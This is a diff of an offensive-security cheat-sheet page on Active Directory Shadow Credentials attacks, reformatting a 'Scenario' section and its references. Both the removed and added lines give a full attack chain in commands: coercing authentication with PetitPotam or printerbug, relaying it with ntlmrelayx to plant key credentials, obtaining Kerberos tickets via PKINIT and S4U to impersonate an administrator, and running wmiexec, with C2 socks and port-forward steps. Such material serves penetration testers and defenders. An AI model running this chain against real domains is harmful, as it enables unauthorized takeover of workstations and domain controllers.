@@ -39,38 +39,36 @@
   python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
   ```
 
-**Scenario**:
+## Scenario
 
-- **Scenario 1**: Shadow Credential relaying
-  - Trigger an NTLM authentication from `DC01` (PetitPotam)
-  - Relay it to `DC02` (ntlmrelayx)
-  - Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
-  - Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
+### Shadow Credential Relaying
 
-- **Scenario 2**: Workstation Takeover with RBCD
-  ```ps1
-  # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81
+- Trigger an NTLM authentication from `DC01` (PetitPotam)
+- Relay it to `DC02` (ntlmrelayx)
+- Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
+- Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
 
-  # Set up ntlmrelayx to relay authentication from target workstation to DC 
-  proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
 
-  # Execute printer bug to trigger authentication from target workstation 
-  proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
+### Workstation Takeover with RBCD
 
-  # Get a TGT using the newly acquired certificate via PKINIT 
-  proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
+**Requirements**:
 
-  # Get a ST (service ticket) for the target account 
-  proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
+* `Print Spooler` service running
+* `WebClient service` running
 
-  # Utilize the ST for future activity 
-  export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
-  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
-  ```
+**Exploitation**:
+
+* Using your C2, start a reverse socks on port 1080: `socks 1080`
+* Enable port forward from port 8081 to 81 on the compromised machine: `rportfwd 8081 127.0.0.1 81`
+* Start the relay: `proxychains python3 ntlmrelayx.py -t ldaps://dc.domain.lab --shadow-credentials --shadow-target target\$ --http-port 81`
+* Trigger a callback on webdav: `proxychains python3 printerbug.py domain.lab/user:password@target.domain.lab compromised@8081/file`
+* Use [PKINIT](https://github.com/dirkjanm/PKINITtools) to get a TGT for the machine account: `proxychains python3 gettgtpkinit.py domain.lab/target\$ target.ccache -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>`
+* Elevate your privileges by creating a service ticket impersonating a local admin: `proxychains python3 gets4uticket.py kerberos+ccache://domain.lab\\target\$:target.ccache@dc.domain.lab cifs/target.domain.lab@domain.lab administrator@domain.lab administrator_target.ccache -v`
+* Use your ticket: `export KRB5CCNAME=/path/to/administrator_target.ccache; proxychains python3 wmiexec.py -k -no-pass domain.lab/administrator@target.domain.lab`
 
 
 ## References
 
-* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
+* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel - October 21, 2021](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
 * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 * [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
